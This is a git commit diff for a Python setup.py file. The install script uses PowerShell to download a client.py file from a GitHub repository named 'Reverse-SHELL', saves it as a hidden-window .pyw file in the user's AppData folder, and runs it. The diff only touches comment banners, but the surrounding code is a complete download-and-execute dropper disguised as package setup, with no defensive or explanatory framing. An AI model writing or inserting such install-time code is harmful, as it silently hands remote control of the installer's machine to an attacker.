85eea1a4cf4fb0c262eaa8880587b80ea643eee8
Muzaffar Sharofitdinov <smartboymuzaffar@gmail.com>
2024-04-26 21:19:16 +0900

    Initial commit

--- setup.py
+++ setup.py
@@ -3,11 +3,11 @@ import os, sys, subprocess
 username = os.environ.get('USERNAME')
 path = os.environ['appdata']
 
-
+################################################ setup #################################################################
 powershell_command = (f'powershell invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse'
                       f'-SHELL/master/client.py" -outfile "{path}\\client.pyw"')
 subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
 
 powershell_command = f'powershell.exe {path}\\client.pyw'
 subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
-
+################################################ done ##################################################################
